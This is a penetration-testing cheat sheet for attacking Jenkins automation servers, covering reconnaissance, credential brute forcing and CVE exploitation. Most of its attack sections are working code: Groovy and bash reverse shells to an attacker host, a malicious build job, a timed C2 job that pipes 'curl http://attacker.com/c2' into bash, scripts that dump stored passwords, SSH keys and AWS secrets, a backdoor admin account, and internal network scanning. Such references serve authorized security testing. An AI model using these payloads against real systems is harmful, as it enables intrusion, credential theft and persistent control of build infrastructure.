# Jenkins

**`Default Ports: 8080 (HTTP), 8443 (HTTPS)`**

**Jenkins** is an open-source automation server widely used for continuous integration and continuous delivery (CI/CD). It automates building, testing, and deploying applications. Due to its powerful features including script execution and plugin ecosystem, Jenkins is a high-value target that can lead to complete infrastructure compromise.

### Connect <a href="#connect" id="connect"></a>

#### Using Web Browser <a href="#using-web-browser" id="using-web-browser"></a>

Access Jenkins through its web interface for manual testing and interaction.

**Basic Web Access**

```
# HTTP access
http://target.com:8080
http://192.168.1.100:8080

# HTTPS access
https://target.com:8443
```

**Common Jenkins Paths**

```
# Common paths
http://target.com:8080/login
http://target.com:8080/signup
http://target.com:8080/dashboard
http://target.com:8080/manage
http://target.com:8080/script
```

#### Using Jenkins CLI <a href="#using-jenkins-cli" id="using-jenkins-cli"></a>

Use the official Jenkins CLI for automated job management and system interaction.

**Download and Setup CLI**

```
# Download Jenkins CLI
wget http://target.com:8080/jnlpJars/jenkins-cli.jar

# Use CLI (requires authentication)
java -jar jenkins-cli.jar -s http://target.com:8080/ -auth username:password who-am-i
```

**Job Management**

```
# List jobs
java -jar jenkins-cli.jar -s http://target.com:8080/ -auth username:password list-jobs

# Build job
java -jar jenkins-cli.jar -s http://target.com:8080/ -auth username:password build job-name
```

#### Using API <a href="#using-api" id="using-api"></a>

Use Jenkins REST API for automated interaction and data extraction.

**Basic API Access**

```
# Get Jenkins version
curl http://target.com:8080/api/json

# With authentication
curl -u username:API_TOKEN http://target.com:8080/api/json
```

**Job Information**

```
# Get jobs list
curl -u username:API_TOKEN http://target.com:8080/api/json?tree=jobs[name]
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use `Nmap` to identify Jenkins installations and gather initial information:

```
nmap -p 8080,8443 -sV target.com
```

#### Banner Grabbing and Version Detection <a href="#banner-grabbing-and-version-detection" id="banner-grabbing-and-version-detection"></a>

Identify Jenkins version and gather system information through various methods.

**Version Detection Methods**

```
# Get Jenkins version
curl -s http://target.com:8080 | grep -i "jenkins"

# From API
curl -s http://target.com:8080/api/json | jq .

# From headers
curl -I http://target.com:8080 | grep -i "x-jenkins"

# Version from login page
curl -s http://target.com:8080/login | grep "Jenkins ver"
```

**Access Script Console**

```
# Script console (if accessible)
http://target.com:8080/script
```

#### Anonymous Access Check <a href="#anonymous-access-check" id="anonymous-access-check"></a>

Test if Jenkins allows anonymous access to sensitive areas.

```
# Check if anonymous access is enabled
curl -s http://target.com:8080/asynchPeople/

# Check script console
curl -s http://target.com:8080/script

# Check job creation
curl -s http://target.com:8080/view/all/newJob

# Check system log
curl -s http://target.com:8080/log/all
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### User Enumeration <a href="#user-enumeration" id="user-enumeration"></a>

Discover Jenkins users and authentication mechanisms.

**Manual User Discovery**

```
# People directory (if accessible)
curl http://target.com:8080/asynchPeople/

# User API
curl http://target.com:8080/user/admin/api/json

# Signup page (check if enabled)
curl http://target.com:8080/signup
```

**Automated User Enumeration**

```
# Using Metasploit
use auxiliary/scanner/http/jenkins_enum
set RHOSTS target.com
set RPORT 8080
run
```

#### Job Enumeration <a href="#job-enumeration" id="job-enumeration"></a>

Enumerate Jenkins jobs and their configurations to identify potential attack vectors.

**Job Discovery**

```
# List all jobs
curl -u username:API_TOKEN http://target.com:8080/api/json?tree=jobs[name,url]

# Job details
curl -u username:API_TOKEN http://target.com:8080/job/job-name/api/json
```

**Build Information**

```
# Build history
curl -u username:API_TOKEN http://target.com:8080/job/job-name/api/json?tree=builds[number,url]

# Last build console output
curl -u username:API_TOKEN http://target.com:8080/job/job-name/lastBuild/consoleText
```

#### Plugin Enumeration <a href="#plugin-enumeration" id="plugin-enumeration"></a>

Identify installed plugins and check for known vulnerabilities.

```
# List installed plugins
curl -u username:API_TOKEN http://target.com:8080/pluginManager/api/json?depth=1

# Check for vulnerable plugins
curl -s http://target.com:8080/pluginManager/installed

# Update center
curl http://target.com:8080/updateCenter/api/json
```

#### Credentials Enumeration <a href="#credentials-enumeration" id="credentials-enumeration"></a>

Search for stored credentials and sensitive information in Jenkins.

**Credentials Store Access**

```
# Credentials store (requires admin)
curl -u username:API_TOKEN http://target.com:8080/credentials/

# Check job configurations for credentials
curl -u username:API_TOKEN http://target.com:8080/job/job-name/config.xml
```

**Search for Sensitive Data**

```
# Search for credentials in build logs
curl -u username:API_TOKEN http://target.com:8080/job/job-name/lastBuild/consoleText | grep -i "password\|secret\|token"
```

#### Node Enumeration <a href="#node-enumeration" id="node-enumeration"></a>

Enumerate Jenkins build nodes and system information.

```
# List build nodes
curl -u username:API_TOKEN http://target.com:8080/computer/api/json

# Node details
curl -u username:API_TOKEN http://target.com:8080/computer/(master)/api/json

# System information
curl -u username:API_TOKEN http://target.com:8080/systemInfo
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Default and Weak Credentials <a href="#default-and-weak-credentials" id="default-and-weak-credentials"></a>

Jenkins installations often use default or weak credentials, especially in development environments.

**Common Default Credentials**

```
# Common default/weak credentials
admin:admin
jenkins:jenkins
admin:password
admin:jenkins
user:user
```

**Credential Testing**

```
# Try login
curl -X POST http://target.com:8080/j_acegi_security_check \
  -d "j_username=admin&j_password=admin" \
  -v

# Check response for session cookie
```

#### Brute Force Attack <a href="#brute-force-attack" id="brute-force-attack"></a>

Brute forcing Jenkins can reveal weak admin passwords, especially on development instances.

**Using Hydra**

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=loginError"
```

**Using Metasploit**

```
use auxiliary/scanner/http/jenkins_login
set RHOSTS target.com
set USERNAME admin
set PASS_FILE passwords.txt
run
```

**Using Burp Suite Intruder**

```
# Capture POST to /j_acegi_security_check
# Set j_password as payload position
```

#### Script Console Exploitation <a href="#script-console-exploitation" id="script-console-exploitation"></a>

The Jenkins script console allows execution of Groovy code with system privileges, making it a critical attack vector.

**Basic Command Execution**

```
// If script console is accessible
// http://target.com:8080/script

// Command execution
def cmd = "whoami"
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout"
println "err> $serr"
```

**Reverse Shell Payloads**

```
// Reverse shell (Linux)
String host="attacker-ip";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();

// Windows reverse shell
String host="attacker-ip";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

#### Job Creation and Exploitation <a href="#job-creation-and-exploitation" id="job-creation-and-exploitation"></a>

Create malicious Jenkins jobs to execute arbitrary commands on the system.

**Create Malicious Job**

```
# Create malicious job via API
curl -X POST http://target.com:8080/createItem?name=backdoor \
  -u username:API_TOKEN \
  --data-binary @job-config.xml \
  -H "Content-Type: application/xml"
```

**Malicious Job Configuration**

```
# job-config.xml with command execution
<project>
  <builders>
    <hudson.tasks.Shell>
      <command>bash -i &gt;&amp; /dev/tcp/attacker-ip/4444 0&gt;&amp;1</command>
    </hudson.tasks.Shell>
  </builders>
</project>
```

**Trigger Malicious Build**

```
# Trigger build
curl -X POST http://target.com:8080/job/backdoor/build \
  -u username:API_TOKEN
```

#### API Token Exploitation <a href="#api-token-exploitation" id="api-token-exploitation"></a>

Use Jenkins API tokens for authentication and privilege escalation.

**Generate API Token**

```
# Generate API token (requires login)
curl -X POST http://target.com:8080/user/username/descriptorByName/jenkins.security.ApiTokenProperty/generateNewToken \
  -u username:password \
  -d "newTokenName=my-token"
```

**Use API Token**

```
# Use API token
curl -u username:API_TOKEN http://target.com:8080/api/json
```

#### CVE Exploitation <a href="#cve-exploitation" id="cve-exploitation"></a>

Exploit known Jenkins vulnerabilities for system compromise.

**Arbitrary File Read (CVE-2024-23897)**

```
# CVE-2024-23897 (Arbitrary File Read)
# Jenkins < 2.441, < 2.426.3 LTS
java -jar jenkins-cli.jar -s http://target.com:8080/ help "@/etc/passwd"
```

**Script Security Bypass (CVE-2019-1003000)**

```
# CVE-2019-1003000 (Script Security Sandbox Bypass)
# Execute arbitrary code via Groovy script
```

**Remote Code Execution (CVE-2018-1000861)**

```
# CVE-2018-1000861 (Stapler Web Framework RCE)
# Use Metasploit
use exploit/multi/http/jenkins_metaprogramming
set RHOSTS target.com
set RPORT 8080
run
```

#### Plugin Vulnerabilities <a href="#plugin-vulnerabilities" id="plugin-vulnerabilities"></a>

Exploit vulnerabilities in Jenkins plugins for additional attack vectors.

```
# Git plugin - Command injection
# If Git plugin installed, check for command injection in repository URL

# Script Security plugin bypass
# Check for groovy script execution points

# Blue Ocean plugin - Path traversal
# CVE-2024-23898
curl http://target.com:8080/blue/rest/organizations/jenkins/pipelines/../../credentials/

# Credentials Binding plugin
# Check if credentials are exposed in build logs
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Credentials Harvesting <a href="#credentials-harvesting" id="credentials-harvesting"></a>

Extract stored credentials from Jenkins for lateral movement and privilege escalation.

**Username/Password Credentials**

```
// Dump all credentials (Script Console)
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
    Jenkins.instance,
    null,
    null
);

for (c in creds) {
  println(c.id + ":" + c.username + ":" + c.password);
}
```

**SSH Key Credentials**

```
// Dump SSH keys
def  sshCreds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey.class,
    Jenkins.instance,
    null,
    null
);

for (c in sshCreds) {
  println(c.id + ":" + c.username);
  println(c.privateKey);
}
```

**AWS Credentials**

```
// Dump AWS credentials
def awsCreds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.jenkins.plugins.awscredentials.AWSCredentials.class,
    Jenkins.instance,
    null,
    null
);

for (c in awsCreds) {
  println("ID: " + c.id);
  println("Access Key: " + c.accessKey);
  println("Secret Key: " + c.secretKey);
}
```

#### Persistence <a href="#persistence" id="persistence"></a>

Establish persistent access to Jenkins for long-term control.

**Create Backdoor Admin User**

```
// Create backdoor admin user (Script Console)
def hudsonRealm = new hudson.security.HudsonPrivateSecurityRealm(false)
hudsonRealm.createAccount("backdoor", "P@ssw0rd123!")
Jenkins.instance.setSecurityRealm(hudsonRealm)
def strategy = new hudson.security.FullControlOnceLoggedInAuthorizationStrategy()
strategy.setAllowAnonymousRead(false)
Jenkins.instance.setAuthorizationStrategy(strategy)
Jenkins.instance.save()
```

**Create Persistent C2 Job**

```
// Create persistent job for C2
// Job that checks external server for commands
def jobConfig = """
<project>
  <triggers>
    <hudson.triggers.TimerTrigger>
      <spec>*/5 * * * *</spec>
    </hudson.triggers.TimerTrigger>
  </triggers>
  <builders>
    <hudson.tasks.Shell>
      <command>
curl http://attacker.com/c2 | bash
      </command>
    </hudson.tasks.Shell>
  </builders>
</project>
"""
```

#### Lateral Movement <a href="#lateral-movement" id="lateral-movement"></a>

Use Jenkins as a pivot point for network reconnaissance and lateral movement.

**Network Discovery**

```
// Enumerate network from Jenkins (Script Console)
def hosts = []
for (int i=1; i<255; i++) {
  try {
    def addr = InetAddress.getByName("192.168.1." + i)
    if (addr.isReachable(1000)) {
      hosts.add(addr.getHostAddress())
    }
  } catch (Exception e) {}
}
println hosts
```

**Port Scanning**

```
// Port scan
def scanPorts(String host, List ports) {
  def open = []
  ports.each { port ->
    try {
      def socket = new Socket()
      socket.connect(new InetSocketAddress(host, port), 1000)
      open.add(port)
      socket.close()
    } catch (Exception e) {}
  }
  return open
}

def result = scanPorts("192.168.1.100", [22, 80, 443, 3389, 8080])
println "Open ports: " + result
```

#### Source Code and Secret Extraction <a href="#source-code-and-secret-extraction" id="source-code-and-secret-extraction"></a>

Extract source code and sensitive information from Jenkins jobs and builds.

**Download Source Code**

```
# Download workspace with source code
curl -u username:API_TOKEN \
  http://target.com:8080/job/project/ws/*zip*/ws.zip \
  -o workspace.zip
```

**Extract Secrets from Build Logs**

```
# Extract secrets from build logs
for job in $(curl -s -u username:API_TOKEN http://target.com:8080/api/json?tree=jobs[name] | jq -r '.jobs[].name'); do
  curl -s -u username:API_TOKEN http://target.com:8080/job/$job/lastBuild/consoleText | \
    grep -Ei "password|secret|token|key|credential" >> secrets.txt
done
```

**Analyze Job Configurations**

```
# Download job configurations
curl -u username:API_TOKEN http://target.com:8080/job/project/config.xml | \
  grep -Ei "password|secret|credential"
```

#### Cloud Infrastructure Access <a href="#cloud-infrastructure-access" id="cloud-infrastructure-access"></a>

Use Jenkins-stored cloud credentials to access cloud infrastructure.

```
// If AWS credentials are configured
// Use them to access AWS resources
def awsCreds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.jenkins.plugins.awscredentials.AWSCredentials.class,
    Jenkins.instance,
    null,
    null
)[0]

// Access AWS
def accessKey = awsCreds.accessKey
def secretKey = awsCreds.secretKey.plainText

// Now use AWS CLI or SDK with these credentials
println "export AWS_ACCESS_KEY_ID=" + accessKey
println "export AWS_SECRET_ACCESS_KEY=" + secretKey
```

### Common Jenkins Paths <a href="#common-jenkins-paths-1" id="common-jenkins-paths-1"></a>

| Path               | Description           | Requires Auth |
| ------------------ | --------------------- | ------------- |
| `/script`          | Groovy script console | Yes (admin)   |
| `/manage`          | Manage Jenkins        | Yes (admin)   |
| `/credentials/`    | Credentials store     | Yes (admin)   |
| `/asynchPeople/`   | User directory        | Varies        |
| `/systemInfo`      | System information    | Yes           |
| `/script`          | Script console        | Yes (admin)   |
| `/view/all/newJob` | Create job            | Yes           |
| `/pluginManager/`  | Plugin management     | Yes (admin)   |
| `/computer/`       | Build nodes           | Yes           |
| `/log/all`         | System logs           | Yes           |

### Useful Groovy Scripts <a href="#useful-groovy-scripts" id="useful-groovy-scripts"></a>

```
// List all environment variables
System.getenv().each { k, v -> println "${k}:${v}" }

// Read file
println new File('/etc/passwd').text

// Write file
new File('/tmp/backdoor.sh').write('#!/bin/bash\nnc attacker-ip 4444 -e /bin/bash')

// Execute command and get output
def proc = "ls -la /".execute()
println proc.text

// Download and execute
new URL('http://attacker.com/shell.sh').openStream().eachLine { line ->
    println line
}
"chmod +x /tmp/shell.sh".execute()
"/tmp/shell.sh".execute()
```

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool            | Description            | Primary Use Case       |
| --------------- | ---------------------- | ---------------------- |
| jenkins-cli.jar | Official CLI           | Job management         |
| curl            | HTTP client            | API interaction        |
| Burp Suite      | Web proxy              | Request manipulation   |
| Metasploit      | Exploitation framework | Automated exploitation |
| Nmap            | Network scanner        | Service detection      |

### Security Misconfigurations to Test <a href="#security-misconfigurations-to-test" id="security-misconfigurations-to-test"></a>

* ❌ No authentication required
* ❌ Anonymous read access enabled
* ❌ Script console accessible without authentication
* ❌ Default or weak credentials
* ❌ Signup enabled
* ❌ Outdated Jenkins version
* ❌ Vulnerable plugins installed
* ❌ Credentials stored in job configurations
* ❌ No HTTPS encryption
* ❌ CSRF protection disabled
* ❌ Permissive authorization strategy
* ❌ Build agents with excessive permissions
